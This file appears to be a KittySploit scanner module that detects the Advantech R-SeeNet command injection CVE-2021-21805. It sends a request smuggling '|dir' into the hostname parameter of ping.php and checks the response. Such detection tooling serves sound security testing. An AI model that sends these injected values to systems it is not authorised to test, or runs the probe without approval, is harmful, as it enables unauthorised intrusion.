#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Advantech R-SeeNet 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Advantech R-SeeNet 2.4.12 - OS Command Injection Detection',
        'description': 'Advantech R-SeeNet 2.4.12 is susceptible to remote OS command execution via the ping.php script functionality. An attacker, via a specially crafted HTTP request, can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'rce', 'r-seenet', 'advantech', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://talosintelligence.com/vulnerability_reports/TALOS-2021-1274',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21805',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21805',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-21805',
    }

    def run(self):
        r = self.http_request(method="GET", path='/php/ping.php?hostname=|dir', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<title>Ping |dir</title>', 'bottom.php',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Advantech R-SeeNet 2.4.12 - OS Command Injection detected",
                path='/php/ping.php?hostname=|dir',
            )
            return True
        return False

